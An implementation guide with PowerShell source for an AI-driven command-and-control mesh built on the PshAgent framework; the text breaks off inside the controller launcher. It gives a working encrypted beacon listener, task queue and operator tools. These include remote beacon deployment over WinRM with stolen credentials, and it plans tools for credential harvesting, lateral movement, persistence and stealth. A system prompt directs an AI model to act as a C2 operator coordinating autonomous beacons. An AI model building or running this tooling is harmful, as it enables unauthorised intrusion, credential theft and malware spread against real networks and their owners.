# C2 Agent Mesh — Implementation Guide

> Complete implementation spec for building a C2 agent mesh on top of PshAgent.
> Module path: `c2-mesh/` at repo root. Zero modifications to `PshAgent/`.

---

## Table of Contents

1. [Architecture Overview](#1-architecture-overview)
2. [Module Structure](#2-module-structure)
3. [Phase 1: Foundation](#3-phase-1-foundation)
4. [Phase 2: Controller](#4-phase-2-controller)
5. [Phase 3: Beacon Core](#5-phase-3-beacon-core)
6. [Phase 4: Remaining Beacon Tools](#6-phase-4-remaining-beacon-tools)
7. [Phase 5: Mesh](#7-phase-5-mesh)
8. [Verification Steps](#8-verification-steps)
9. [PshAgent API Reference](#9-pshagent-api-reference)

---

## 1. Architecture Overview

### Component Diagram

```
┌─────────────────────────────────────────────────────────┐
│                    OPERATOR (Human)                       │
│                                                           │
│  Start-PshAgent w/ controller tools                      │
│  "Deploy beacon to 10.0.1.5" → AI routes to tools       │
└────────────────┬──────────────────────────────────────────┘
                 │
                 ▼
┌─────────────────────────────────────────────────────────┐
│              CONTROLLER (PshAgent + HttpListener)         │
│                                                           │
│  ┌──────────────┐  ┌──────────────┐  ┌───────────────┐  │
│  │ Beacon       │  │ Task Queue   │  │ Operator      │  │
│  │ Registry     │  │ (per-beacon) │  │ Tools (×5)    │  │
│  │ (ConcDict)   │  │              │  │               │  │
│  └──────┬───────┘  └──────┬───────┘  └───────┬───────┘  │
│         │                 │                   │          │
│         └─────────┬───────┘                   │          │
│                   ▼                           │          │
│  ┌──────────────────────────────┐             │          │
│  │ HTTP Listener (:8443 TLS)   │◄────────────┘          │
│  │ /register  /checkin  /task  │                         │
│  └──────────────┬──────────────┘                         │
└─────────────────┼────────────────────────────────────────┘
                  │ HTTPS
                  ▼
┌─────────────────────────────────────────────────────────┐
│              BEACON (PshAgent polling loop)               │
│                                                           │
│  ┌───────────┐  ┌─────────────┐  ┌────────────────────┐ │
│  │ Check-in  │  │ Beacon      │  │ AI Agent           │ │
│  │ Loop      │  │ Hooks (×4)  │  │ (tool execution)   │ │
│  └─────┬─────┘  └──────┬──────┘  └────────┬───────────┘ │
│        │               │                   │             │
│        │    ┌──────────────────────────┐    │             │
│        └───►│ Beacon Tools             │◄───┘             │
│             │ host_recon, port_scan,   │                  │
│             │ net_recon, cred_harvest, │                  │
│             │ lateral_move, deploy,    │                  │
│             │ persist, file_ops        │                  │
│             └──────────────────────────┘                  │
└──────────────────────────────────────────────────────────┘
                  │
                  ▼ (Phase 5)
┌─────────────────────────────────────────────────────────┐
│                    MESH LAYER                             │
│                                                           │
│  Beacon ←──relay──► Beacon ←──relay──► Beacon            │
│  Mesh discovery, swarm tasking, multi-hop relay          │
└──────────────────────────────────────────────────────────┘
```

### PshAgent Mapping

| C2 Concept | PshAgent Abstraction | Notes |
|---|---|---|
| Operator CLI | `Start-PshAgent` with custom tools | Interactive REPL, AI-driven |
| Controller | Background runspace + `HttpListener` | Not an agent itself — infrastructure |
| Operator commands | `New-Tool` (×5) | list_beacons, task_beacon, get_results, deploy_beacon, kill_beacon |
| Beacon AI brain | `New-Agent` + `Invoke-Agent` | Executes tasks from controller |
| Beacon tools | `New-Tool` (×8) | host_recon, port_scan, net_recon, cred_harvest, lateral_move, deploy_beacon, persist, file_ops |
| Beacon hooks | `New-Hook` (×4) | telemetry, check-in, kill switch, stealth |
| Beacon stop | `StopCondition` | Kill switch or max-steps |
| Sub-agents | `New-SubAgentTool` | For complex multi-step beacon tasks |
| Mesh relay | `New-Tool` wrapping HTTP forwarding | Beacon-to-beacon relay |
| Comms encryption | `AesGcm` (.NET) | Wraps all HTTP payloads |

### Data Flow

```
Operator types: "scan 10.0.1.0/24 from beacon-alpha"
  → PshAgent AI selects tool: task_beacon(beaconId='alpha', task='scan 10.0.1.0/24')
    → Controller queues task for beacon-alpha
      → Beacon-alpha checks in, receives task
        → Beacon creates PshAgent, runs Invoke-Agent with port_scan tool
          → Results flow back: tool output → check-in response → Controller → Operator
```

---

## 2. Module Structure

```
c2-mesh/
├── c2-mesh.psd1                    # Module manifest
├── c2-mesh.psm1                    # Module loader (dot-sources everything)
├── Config/
│   └── c2-config.ps1               # Constants, defaults, paths
├── Crypto/
│   └── Invoke-C2Crypto.ps1         # AES-256-GCM encrypt/decrypt
├── Controller/
│   ├── Start-C2Listener.ps1        # HttpListener in background runspace
│   ├── Get-BeaconRegistry.ps1      # ConcurrentDictionary management
│   ├── Send-BeaconTask.ps1         # Queue task for a beacon
│   ├── Get-BeaconResults.ps1       # Retrieve results from a beacon
│   ├── New-OperatorTools.ps1       # 5 operator tools (PshAgentTool[])
│   └── Start-C2Controller.ps1      # Compose & launch controller
├── Beacon/
│   ├── Register-Beacon.ps1         # POST /register on startup
│   ├── Invoke-CheckIn.ps1          # POST /checkin (poll for tasks)
│   ├── New-BeaconHooks.ps1         # 4 hooks (telemetry, checkin, kill, stealth)
│   ├── New-BeaconTools.ps1         # 3 core tools (host_recon, port_scan, net_recon)
│   └── Start-C2Beacon.ps1          # Compose & launch beacon polling loop
├── BeaconTools/
│   ├── Invoke-CredHarvest.ps1      # cred_harvest tool
│   ├── Invoke-LateralMove.ps1      # lateral_move tool
│   ├── Invoke-DeployBeacon.ps1     # deploy_beacon tool (from beacon side)
│   ├── Invoke-Persist.ps1          # persist tool
│   └── Invoke-FileOps.ps1          # file_ops tool
├── Mesh/
│   ├── New-MeshRelayTool.ps1       # Relay tasks through peer beacons
│   ├── Invoke-MeshDiscovery.ps1    # Discover peer beacons on network
│   └── Invoke-SwarmTask.ps1        # Distribute task across mesh
└── Launchers/
    ├── start-controller.ps1        # Script entry point for controller
    └── start-beacon.ps1            # Script entry point for beacon
```

---

## 3. Phase 1: Foundation

### 3.1 `Config/c2-config.ps1`

```powershell
# C2 Mesh Configuration — constants and defaults

$script:C2Config = @{
    # Controller
    ListenPort       = 8443
    ListenPrefix     = 'https://+:8443/'
    CertThumbprint   = $null  # Set at runtime or use self-signed

    # Beacon defaults
    CheckInInterval  = 30          # seconds between check-ins
    Jitter           = 0.2         # ±20% randomization on interval
    MaxMissedCheckins = 5          # mark beacon dead after N misses
    BeaconUserAgent  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

    # Crypto
    KeyDerivation    = 'HKDF-SHA256'
    NonceBytes       = 12
    TagBytes         = 16

    # Paths
    SessionDir       = Join-Path ([System.Environment]::GetFolderPath('UserProfile')) '.c2-mesh' 'sessions'
    LogDir           = Join-Path ([System.Environment]::GetFolderPath('UserProfile')) '.c2-mesh' 'logs'

    # Agent defaults
    ConnectionString = 'anthropic/claude-sonnet-4-20250514'
    MaxAgentSteps    = 15
    BeaconMaxSteps   = 10

    # Mesh
    MeshPort         = 9443
    RelayTTL         = 3           # max hops for relay
}

# Ensure dirs exist
@($script:C2Config.SessionDir, $script:C2Config.LogDir) | ForEach-Object {
    if (-not (Test-Path $_)) { New-Item -ItemType Directory -Path $_ -Force | Out-Null }
}
```

### 3.2 `Crypto/Invoke-C2Crypto.ps1`

Uses `System.Security.Cryptography.AesGcm` (available in .NET 6+ / PowerShell 7+).

```powershell
function Invoke-C2Encrypt {
    <#
    .SYNOPSIS
    AES-256-GCM encrypt. Returns base64 string: nonce + ciphertext + tag.
    .PARAMETER Plaintext
    String to encrypt
    .PARAMETER Key
    32-byte key (base64 string or byte array)
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Plaintext,

        [Parameter(Mandatory)]
        $Key
    )

    $keyBytes = if ($Key -is [byte[]]) { $Key } else { [Convert]::FromBase64String($Key) }
    if ($keyBytes.Length -ne 32) { throw "Key must be 32 bytes (AES-256)" }

    $nonceLen = $script:C2Config.NonceBytes
    $tagLen   = $script:C2Config.TagBytes

    $plaintextBytes = [System.Text.Encoding]::UTF8.GetBytes($Plaintext)
    $nonce          = [byte[]]::new($nonceLen)
    $tag            = [byte[]]::new($tagLen)
    $ciphertext     = [byte[]]::new($plaintextBytes.Length)

    [System.Security.Cryptography.RandomNumberGenerator]::Fill($nonce)

    $aes = [System.Security.Cryptography.AesGcm]::new($keyBytes, $tagLen)
    try {
        $aes.Encrypt($nonce, $plaintextBytes, $ciphertext, $tag)
    }
    finally {
        $aes.Dispose()
    }

    # Pack: nonce + ciphertext + tag
    $packed = [byte[]]::new($nonceLen + $ciphertext.Length + $tagLen)
    [Buffer]::BlockCopy($nonce, 0, $packed, 0, $nonceLen)
    [Buffer]::BlockCopy($ciphertext, 0, $packed, $nonceLen, $ciphertext.Length)
    [Buffer]::BlockCopy($tag, 0, $packed, $nonceLen + $ciphertext.Length, $tagLen)

    return [Convert]::ToBase64String($packed)
}

function Invoke-C2Decrypt {
    <#
    .SYNOPSIS
    AES-256-GCM decrypt. Takes base64 string (nonce + ciphertext + tag).
    .PARAMETER CipherText
    Base64-encoded packed data
    .PARAMETER Key
    32-byte key (base64 string or byte array)
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$CipherText,

        [Parameter(Mandatory)]
        $Key
    )

    $keyBytes = if ($Key -is [byte[]]) { $Key } else { [Convert]::FromBase64String($Key) }
    if ($keyBytes.Length -ne 32) { throw "Key must be 32 bytes (AES-256)" }

    $nonceLen = $script:C2Config.NonceBytes
    $tagLen   = $script:C2Config.TagBytes

    $packed     = [Convert]::FromBase64String($CipherText)
    $cipherLen  = $packed.Length - $nonceLen - $tagLen

    if ($cipherLen -lt 0) { throw "Invalid ciphertext: too short" }

    $nonce      = [byte[]]::new($nonceLen)
    $cipher     = [byte[]]::new($cipherLen)
    $tag        = [byte[]]::new($tagLen)
    $plaintext  = [byte[]]::new($cipherLen)

    [Buffer]::BlockCopy($packed, 0, $nonce, 0, $nonceLen)
    [Buffer]::BlockCopy($packed, $nonceLen, $cipher, 0, $cipherLen)
    [Buffer]::BlockCopy($packed, $nonceLen + $cipherLen, $tag, 0, $tagLen)

    $aes = [System.Security.Cryptography.AesGcm]::new($keyBytes, $tagLen)
    try {
        $aes.Decrypt($nonce, $cipher, $tag, $plaintext)
    }
    finally {
        $aes.Dispose()
    }

    return [System.Text.Encoding]::UTF8.GetString($plaintext)
}

function New-C2Key {
    <#
    .SYNOPSIS
    Generate a random 32-byte AES-256 key. Returns base64 string.
    #>
    [CmdletBinding()]
    param()

    $key = [byte[]]::new(32)
    [System.Security.Cryptography.RandomNumberGenerator]::Fill($key)
    return [Convert]::ToBase64String($key)
}
```

### 3.3 `c2-mesh.psd1`

```powershell
@{
    RootModule        = 'c2-mesh.psm1'
    ModuleVersion     = '0.1.0'
    GUID              = 'a1b2c3d4-e5f6-7890-abcd-ef1234567890'
    Author            = 'C2 Mesh'
    Description       = 'C2 Agent Mesh built on PshAgent'
    PowerShellVersion = '7.0'
    RequiredModules   = @(
        @{ ModuleName = '../PshAgent/PshAgent.psd1'; ModuleVersion = '0.1.0' }
    )
    FunctionsToExport = @(
        # Crypto
        'Invoke-C2Encrypt'
        'Invoke-C2Decrypt'
        'New-C2Key'
        # Controller
        'Start-C2Listener'
        'Stop-C2Listener'
        'Get-BeaconRegistry'
        'Send-BeaconTask'
        'Get-BeaconResults'
        'New-OperatorTools'
        'Start-C2Controller'
        # Beacon
        'Register-Beacon'
        'Invoke-CheckIn'
        'New-BeaconHooks'
        'New-BeaconTools'
        'Start-C2Beacon'
        # Beacon Tools
        'Invoke-CredHarvest'
        'Invoke-LateralMove'
        'Invoke-DeployBeacon'
        'Invoke-Persist'
        'Invoke-FileOps'
        # Mesh
        'New-MeshRelayTool'
        'Invoke-MeshDiscovery'
        'Invoke-SwarmTask'
    )
}
```

### 3.4 `c2-mesh.psm1`

```powershell
# C2 Mesh Module Loader
# Dot-source in dependency order: Config → Crypto → Controller → Beacon → BeaconTools → Mesh

$scriptRoot = $PSScriptRoot

# Config (must be first — everything reads $script:C2Config)
. "$scriptRoot/Config/c2-config.ps1"

# Crypto
. "$scriptRoot/Crypto/Invoke-C2Crypto.ps1"

# Controller
. "$scriptRoot/Controller/Start-C2Listener.ps1"
. "$scriptRoot/Controller/Get-BeaconRegistry.ps1"
. "$scriptRoot/Controller/Send-BeaconTask.ps1"
. "$scriptRoot/Controller/Get-BeaconResults.ps1"
. "$scriptRoot/Controller/New-OperatorTools.ps1"
. "$scriptRoot/Controller/Start-C2Controller.ps1"

# Beacon
. "$scriptRoot/Beacon/Register-Beacon.ps1"
. "$scriptRoot/Beacon/Invoke-CheckIn.ps1"
. "$scriptRoot/Beacon/New-BeaconHooks.ps1"
. "$scriptRoot/Beacon/New-BeaconTools.ps1"
. "$scriptRoot/Beacon/Start-C2Beacon.ps1"

# Beacon Tools (Phase 4)
. "$scriptRoot/BeaconTools/Invoke-CredHarvest.ps1"
. "$scriptRoot/BeaconTools/Invoke-LateralMove.ps1"
. "$scriptRoot/BeaconTools/Invoke-DeployBeacon.ps1"
. "$scriptRoot/BeaconTools/Invoke-Persist.ps1"
. "$scriptRoot/BeaconTools/Invoke-FileOps.ps1"

# Mesh (Phase 5)
. "$scriptRoot/Mesh/New-MeshRelayTool.ps1"
. "$scriptRoot/Mesh/Invoke-MeshDiscovery.ps1"
. "$scriptRoot/Mesh/Invoke-SwarmTask.ps1"

Export-ModuleMember -Function @(
    'Invoke-C2Encrypt', 'Invoke-C2Decrypt', 'New-C2Key',
    'Start-C2Listener', 'Stop-C2Listener',
    'Get-BeaconRegistry', 'Send-BeaconTask', 'Get-BeaconResults',
    'New-OperatorTools', 'Start-C2Controller',
    'Register-Beacon', 'Invoke-CheckIn',
    'New-BeaconHooks', 'New-BeaconTools', 'Start-C2Beacon',
    'Invoke-CredHarvest', 'Invoke-LateralMove', 'Invoke-DeployBeacon',
    'Invoke-Persist', 'Invoke-FileOps',
    'New-MeshRelayTool', 'Invoke-MeshDiscovery', 'Invoke-SwarmTask'
)
```

---

## 4. Phase 2: Controller

### 4.1 `Controller/Start-C2Listener.ps1`

HTTP listener runs in a background runspace. Routes:
- `POST /register` — beacon registration
- `POST /checkin` — beacon check-in (returns queued tasks)
- `POST /task` — direct task submission (internal)

```powershell
function Start-C2Listener {
    <#
    .SYNOPSIS
    Start HTTPS listener in a background runspace. Returns listener state hashtable.
    .PARAMETER Port
    Listen port (default from C2Config)
    .PARAMETER Key
    Shared AES-256 key (base64) for payload encryption
    .PARAMETER Registry
    ConcurrentDictionary for beacon state (from Get-BeaconRegistry)
    .PARAMETER TaskQueues
    ConcurrentDictionary of per-beacon task queues
    .PARAMETER ResultStore
    ConcurrentDictionary of per-beacon result lists
    #>
    [CmdletBinding()]
    param(
        [Parameter()]
        [int]$Port = $script:C2Config.ListenPort,

        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, hashtable]]$Registry,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentQueue[hashtable]]]$TaskQueues,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentBag[hashtable]]]$ResultStore
    )

    $prefix = "https://+:${Port}/"

    # Shared state passed into the runspace
    $sharedState = [hashtable]::Synchronized(@{
        Running     = $true
        Key         = $Key
        Registry    = $Registry
        TaskQueues  = $TaskQueues
        ResultStore = $ResultStore
        Config      = $script:C2Config
        Errors      = [System.Collections.Concurrent.ConcurrentBag[string]]::new()
    })

    $runspace = [runspacefactory]::CreateRunspace()
    $runspace.Open()
    $runspace.SessionStateProxy.SetVariable('state', $sharedState)
    $runspace.SessionStateProxy.SetVariable('prefix', $prefix)

    # Import crypto functions into runspace
    $cryptoScript = Get-Content "$PSScriptRoot/../Crypto/Invoke-C2Crypto.ps1" -Raw
    $configScript = Get-Content "$PSScriptRoot/../Config/c2-config.ps1" -Raw

    $ps = [powershell]::Create()
    $ps.Runspace = $runspace

    $null = $ps.AddScript({
        param($cryptoSrc, $configSrc)

        # Load config and crypto into this runspace
        Invoke-Expression $configSrc
        Invoke-Expression $cryptoSrc

        $listener = [System.Net.HttpListener]::new()
        $listener.Prefixes.Add($prefix)
        $listener.Start()

        try {
            while ($state.Running) {
                # Async wait with timeout so we can check Running flag
                $ctxTask = $listener.GetContextAsync()
                while (-not $ctxTask.Wait(1000)) {
                    if (-not $state.Running) { return }
                }
                $ctx = $ctxTask.Result
                $req = $ctx.Request
                $resp = $ctx.Response

                try {
                    $path = $req.Url.AbsolutePath
                    $body = $null
                    if ($req.HasEntityBody) {
                        $reader = [System.IO.StreamReader]::new($req.InputStream)
                        $rawBody = $reader.ReadToEnd()
                        $reader.Close()

                        # Decrypt
                        $json = Invoke-C2Decrypt -CipherText $rawBody -Key $state.Key
                        $body = $json | ConvertFrom-Json -AsHashtable
                    }

                    $result = @{ status = 'error'; message = 'unknown route' }

                    switch ($path) {
                        '/register' {
                            # Body: { beaconId, hostname, username, os, ip, pid }
                            $bid = $body.beaconId
                            $entry = @{
                                beaconId    = $bid
                                hostname    = $body.hostname
                                username    = $body.username
                                os          = $body.os
                                ip          = $body.ip
                                pid         = $body.pid
                                firstSeen   = [datetime]::UtcNow
                                lastCheckin = [datetime]::UtcNow
                                alive       = $true
                                missedCount = 0
                            }
                            $null = $state.Registry.AddOrUpdate($bid, $entry, { param($k, $v) $entry })

                            # Ensure queues exist
                            $null = $state.TaskQueues.GetOrAdd($bid, {
                                [System.Collections.Concurrent.ConcurrentQueue[hashtable]]::new()
                            }.Invoke()[0])
                            $null = $state.ResultStore.GetOrAdd($bid, {
                                [System.Collections.Concurrent.ConcurrentBag[hashtable]]::new()
                            }.Invoke()[0])

                            $result = @{ status = 'registered'; beaconId = $bid }
                        }

                        '/checkin' {
                            # Body: { beaconId, results (optional array) }
                            $bid = $body.beaconId

                            # Update last checkin
                            $existing = $null
                            if ($state.Registry.TryGetValue($bid, [ref]$existing)) {
                                $existing.lastCheckin = [datetime]::UtcNow
                                $existing.missedCount = 0
                                $existing.alive = $true
                            }

                            # Store any results the beacon sent back
                            if ($body.results) {
                                $bag = $null
                                if ($state.ResultStore.TryGetValue($bid, [ref]$bag)) {
                                    foreach ($r in $body.results) {
                                        $bag.Add(@{
                                            taskId    = $r.taskId
                                            output    = $r.output
                                            status    = $r.status
                                            timestamp = [datetime]::UtcNow
                                        })
                                    }
                                }
                            }

                            # Dequeue pending tasks
                            $tasks = @()
                            $queue = $null
                            if ($state.TaskQueues.TryGetValue($bid, [ref]$queue)) {
                                $task = $null
                                while ($queue.TryDequeue([ref]$task)) {
                                    $tasks += $task
                                }
                            }

                            $result = @{ status = 'ok'; tasks = $tasks }
                        }
                    }

                    # Encrypt response
                    $respJson = $result | ConvertTo-Json -Depth 10 -Compress
                    $encrypted = Invoke-C2Encrypt -Plaintext $respJson -Key $state.Key
                    $respBytes = [System.Text.Encoding]::UTF8.GetBytes($encrypted)

                    $resp.StatusCode = 200
                    $resp.ContentType = 'application/octet-stream'
                    $resp.ContentLength64 = $respBytes.Length
                    $resp.OutputStream.Write($respBytes, 0, $respBytes.Length)
                }
                catch {
                    $state.Errors.Add("Listener error: $_")
                    $resp.StatusCode = 500
                }
                finally {
                    $resp.Close()
                }
            }
        }
        finally {
            $listener.Stop()
            $listener.Close()
        }
    }).AddArgument($cryptoScript).AddArgument($configScript)

    $handle = $ps.BeginInvoke()

    return @{
        PowerShell  = $ps
        Handle      = $handle
        Runspace    = $runspace
        SharedState = $sharedState
        Port        = $Port
    }
}

function Stop-C2Listener {
    <#
    .SYNOPSIS
    Stop the background HTTP listener
    .PARAMETER ListenerState
    State hashtable returned by Start-C2Listener
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [hashtable]$ListenerState
    )

    $ListenerState.SharedState.Running = $false
    $ListenerState.PowerShell.EndInvoke($ListenerState.Handle)
    $ListenerState.PowerShell.Dispose()
    $ListenerState.Runspace.Close()
    $ListenerState.Runspace.Dispose()
}
```

### 4.2 `Controller/Get-BeaconRegistry.ps1`

```powershell
function Get-BeaconRegistry {
    <#
    .SYNOPSIS
    Create or return the shared beacon registry and associated stores.
    Returns @{ Registry; TaskQueues; ResultStore }
    #>
    [CmdletBinding()]
    param()

    return @{
        Registry    = [System.Collections.Concurrent.ConcurrentDictionary[string, hashtable]]::new()
        TaskQueues  = [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentQueue[hashtable]]]::new()
        ResultStore = [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentBag[hashtable]]]::new()
    }
}
```

### 4.3 `Controller/Send-BeaconTask.ps1`

```powershell
function Send-BeaconTask {
    <#
    .SYNOPSIS
    Queue a task for a specific beacon
    .PARAMETER BeaconId
    Target beacon ID
    .PARAMETER Task
    Task string (natural language instruction for the beacon AI)
    .PARAMETER TaskQueues
    ConcurrentDictionary of per-beacon task queues
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$BeaconId,

        [Parameter(Mandatory)]
        [string]$Task,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentQueue[hashtable]]]$TaskQueues
    )

    $queue = $null
    if (-not $TaskQueues.TryGetValue($BeaconId, [ref]$queue)) {
        $queue = [System.Collections.Concurrent.ConcurrentQueue[hashtable]]::new()
        $queue = $TaskQueues.GetOrAdd($BeaconId, $queue)
    }

    $taskObj = @{
        taskId    = [guid]::NewGuid().ToString('N').Substring(0, 8)
        task      = $Task
        timestamp = [datetime]::UtcNow.ToString('o')
    }

    $queue.Enqueue($taskObj)
    return $taskObj
}
```

### 4.4 `Controller/Get-BeaconResults.ps1`

```powershell
function Get-BeaconResults {
    <#
    .SYNOPSIS
    Retrieve results from a specific beacon
    .PARAMETER BeaconId
    Target beacon ID
    .PARAMETER ResultStore
    ConcurrentDictionary of per-beacon result bags
    .PARAMETER TaskId
    Optional: filter to specific task ID
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$BeaconId,

        [Parameter(Mandatory)]
        [System.Collections.Concurrent.ConcurrentDictionary[string, System.Collections.Concurrent.ConcurrentBag[hashtable]]]$ResultStore,

        [Parameter()]
        [string]$TaskId
    )

    $bag = $null
    if (-not $ResultStore.TryGetValue($BeaconId, [ref]$bag)) {
        return @()
    }

    $results = @($bag.ToArray())

    if ($TaskId) {
        $results = @($results | Where-Object { $_.taskId -eq $TaskId })
    }

    return $results | Sort-Object { $_.timestamp }
}
```

### 4.5 `Controller/New-OperatorTools.ps1`

Five tools the operator's AI agent uses to manage the C2:

```powershell
function New-OperatorTools {
    <#
    .SYNOPSIS
    Create the 5 operator tools for controlling the C2.
    Returns PshAgentTool[] array.
    .PARAMETER Stores
    Hashtable from Get-BeaconRegistry: @{ Registry; TaskQueues; ResultStore }
    .PARAMETER Key
    Shared encryption key
    .PARAMETER ControllerUrl
    Base URL of the controller (for deploy_beacon)
    #>
    [CmdletBinding()]
    [OutputType([PshAgentTool[]])]
    param(
        [Parameter(Mandatory)]
        [hashtable]$Stores,

        [Parameter(Mandatory)]
        [string]$Key,

        [Parameter(Mandatory)]
        [string]$ControllerUrl
    )

    $registry   = $Stores.Registry
    $taskQueues = $Stores.TaskQueues
    $resultStore = $Stores.ResultStore
    $ctrlUrl    = $ControllerUrl
    $sharedKey  = $Key

    # 1. list_beacons
    $listBeacons = New-Tool -Name 'list_beacons' `
        -Description 'List all registered beacons with their status, hostname, IP, last check-in time, and alive status.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                alive_only = @{
                    type        = 'boolean'
                    description = 'If true, only return beacons marked alive (default: false)'
                }
            }
            required   = @()
        } `
        -Execute {
            param($a)
            $beacons = @()
            foreach ($entry in $registry.GetEnumerator()) {
                $b = $entry.Value
                if ($a.alive_only -and -not $b.alive) { continue }
                $beacons += @{
                    beaconId    = $b.beaconId
                    hostname    = $b.hostname
                    username    = $b.username
                    ip          = $b.ip
                    os          = $b.os
                    pid         = $b.pid
                    alive       = $b.alive
                    lastCheckin = $b.lastCheckin.ToString('o')
                    firstSeen   = $b.firstSeen.ToString('o')
                }
            }
            $beacons | ConvertTo-Json -Depth 5
        }.GetNewClosure()

    # 2. task_beacon
    $taskBeacon = New-Tool -Name 'task_beacon' `
        -Description 'Send a task (natural language instruction) to a specific beacon. The beacon AI will interpret and execute it using its available tools.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                beacon_id = @{ type = 'string'; description = 'Target beacon ID' }
                task      = @{ type = 'string'; description = 'Natural language task for the beacon AI to execute' }
            }
            required   = @('beacon_id', 'task')
        } `
        -Execute {
            param($a)
            $taskObj = Send-BeaconTask -BeaconId $a.beacon_id -Task $a.task -TaskQueues $taskQueues
            "Task queued: $($taskObj | ConvertTo-Json -Compress)"
        }.GetNewClosure()

    # 3. get_results
    $getResults = New-Tool -Name 'get_results' `
        -Description 'Retrieve results from a beacon. Optionally filter by task ID.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                beacon_id = @{ type = 'string'; description = 'Beacon ID to get results from' }
                task_id   = @{ type = 'string'; description = 'Optional: specific task ID to filter by' }
            }
            required   = @('beacon_id')
        } `
        -Execute {
            param($a)
            $results = Get-BeaconResults -BeaconId $a.beacon_id -ResultStore $resultStore -TaskId $a.task_id
            if ($results.Count -eq 0) { 'No results yet.' }
            else { $results | ConvertTo-Json -Depth 5 }
        }.GetNewClosure()

    # 4. deploy_beacon
    $deployBeacon = New-Tool -Name 'deploy_beacon' `
        -Description 'Deploy a new beacon to a target host via PowerShell remoting (WinRM). Requires credentials or existing PSSession access.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                target_host = @{ type = 'string'; description = 'Target hostname or IP' }
                username    = @{ type = 'string'; description = 'Username for authentication' }
                password    = @{ type = 'string'; description = 'Password for authentication' }
                beacon_id   = @{ type = 'string'; description = 'Optional: custom beacon ID (auto-generated if omitted)' }
            }
            required   = @('target_host')
        } `
        -Execute {
            param($a)
            $bid = if ($a.beacon_id) { $a.beacon_id } else { 'beacon-' + [guid]::NewGuid().ToString('N').Substring(0, 6) }
            $target = $a.target_host

            # Build the beacon launch script to run on remote host
            $launchScript = @"
`$ErrorActionPreference = 'Stop'
# Download/copy beacon module and start
# In production this would pull the module from a staging server
# For now, assume the module is available at a known path
Start-C2Beacon -ControllerUrl '$ctrlUrl' -Key '$sharedKey' -BeaconId '$bid'
"@
            try {
                if ($a.username -and $a.password) {
                    $secPass = ConvertTo-SecureString $a.password -AsPlainText -Force
                    $cred = [PSCredential]::new($a.username, $secPass)
                    Invoke-Command -ComputerName $target -Credential $cred -ScriptBlock {
                        param($script) Invoke-Expression $script
                    } -ArgumentList $launchScript
                }
                else {
                    Invoke-Command -ComputerName $target -ScriptBlock {
                        param($script) Invoke-Expression $script
                    } -ArgumentList $launchScript
                }
                "Beacon '$bid' deployment initiated on $target"
            }
            catch {
                "Deploy failed: $_"
            }
        }.GetNewClosure()

    # 5. kill_beacon
    $killBeacon = New-Tool -Name 'kill_beacon' `
        -Description 'Send a kill signal to a beacon. It will terminate on next check-in.' `
        -Parameters @{
            type       = 'object'
            properties = @{
                beacon_id = @{ type = 'string'; description = 'Beacon ID to kill' }
            }
            required   = @('beacon_id')
        } `
        -Execute {
            param($a)
            # Queue a special __kill__ task
            $taskObj = Send-BeaconTask -BeaconId $a.beacon_id -Task '__kill__' -TaskQueues $taskQueues
            # Mark as dead in registry
            $existing = $null
            if ($registry.TryGetValue($a.beacon_id, [ref]$existing)) {
                $existing.alive = $false
            }
            "Kill signal queued for beacon '$($a.beacon_id)'"
        }.GetNewClosure()

    return @($listBeacons, $taskBeacon, $getResults, $deployBeacon, $killBeacon)
}
```

### 4.6 `Controller/Start-C2Controller.ps1`

Composes all controller components and launches the operator CLI.

```powershell
function Start-C2Controller {
    <#
    .SYNOPSIS
    Start the C2 controller: HTTP listener + operator CLI with PshAgent.
    .PARAMETER ConnectionString
    LLM connection string for the operator agent (default from C2Config)
    .PARAMETER Port
    Listen port (default from C2Config)
    .PARAMETER Key
    Shared encryption key. If not provided, generates a new one and displays it.
    #>
    [CmdletBinding()]
    param(
        [Parameter()]
        [string]$ConnectionString = $script:C2Config.ConnectionString,

        [Parameter()]
        [int]$Port = $script:C2Config.ListenPort,

        [Parameter()]
        [string]$Key
    )

    # Generate key if not provided
    if (-not $Key) {
        $Key = New-C2Key
        Write-Host "[*] Generated shared key: $Key" -ForegroundColor Yellow
        Write-Host "[*] Use this key when starting beacons." -ForegroundColor Yellow
    }

    # Create registry stores
    $stores = Get-BeaconRegistry

    # Start HTTP listener
    Write-Host "[*] Starting listener on port $Port..." -ForegroundColor Cyan
    $listenerState = Start-C2Listener -Port $Port -Key $Key `
        -Registry $stores.Registry `
        -TaskQueues $stores.TaskQueues `
        -ResultStore $stores.ResultStore

    Write-Host "[+] Listener started on https://+:${Port}/" -ForegroundColor Green

    $controllerUrl = "https://localhost:${Port}"

    # Create operator tools
    $operatorTools = New-OperatorTools -Stores $stores -Key $Key -ControllerUrl $controllerUrl

    # Build operator system prompt
    $systemPrompt = @"
You are a C2 operator AI assistant. You manage a network of AI-powered beacons through the following tools:

- list_beacons: See all registered beacons and their status
- task_beacon: Send a natural language task to a beacon for autonomous execution
- get_results: Retrieve results from beacon task execution
- deploy_beacon: Deploy a new beacon to a target host
- kill_beacon: Terminate a beacon

When the operator gives you high-level objectives (e.g., "enumerate the internal network"),
break them down into specific beacon tasks and coordinate across multiple beacons.

Always check beacon status before tasking. Wait for results before proceeding to dependent tasks.
Report findings clearly and suggest next steps.
"@

    # Launch operator CLI via Start-PshAgent
    try {
        Start-PshAgent -ConnectionString $ConnectionString `
            -SystemPrompt $systemPrompt `
            -Tools $operatorTools `
